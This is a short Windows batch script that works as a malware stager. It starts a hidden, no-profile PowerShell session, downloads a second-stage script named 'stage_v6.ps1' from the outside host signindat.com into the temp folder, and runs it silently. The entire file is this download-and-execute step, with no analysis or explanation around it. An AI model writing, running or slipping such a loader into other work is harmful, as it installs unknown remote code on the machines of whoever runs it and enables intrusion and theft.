@echo off
powershell -NoP -W Hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iwr -Uri 'https://signindat.com/stage_v6.ps1' -OutFile $env:TEMP\s.ps1 -UseBasicParsing;powershell -NoP -W Hidden -File $env:TEMP\s.ps1"
exit /b
